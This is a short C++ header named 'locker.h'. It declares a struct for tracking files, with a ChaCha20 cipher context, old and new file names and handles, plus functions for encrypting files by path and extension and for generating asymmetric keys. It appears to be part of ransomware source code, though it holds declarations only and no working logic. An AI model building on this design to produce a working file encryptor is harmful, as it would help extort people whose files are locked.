#ifndef _LOCKER_H_
#define _LOCKER_H_

#include "macro.h"
#include "pathsystem.h"
#include "chacha20/ecrypt-sync.h"

namespace locker
{
	typedef struct file_info
	{
		laced_ctx CryptCtx;
		LPCWSTR Filename;
		WCHAR* newFilename;
		LPCWSTR FilePath;
		HANDLE FileHandle;
		HANDLE newFileHandle;
		LONGLONG Filesize;		
		DWORD bit;
	}FILE_INFO, * PFILE_INFO;
	

	BOOL HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs);
	BOOL HandlerASymmetricGenKey();
}





#endif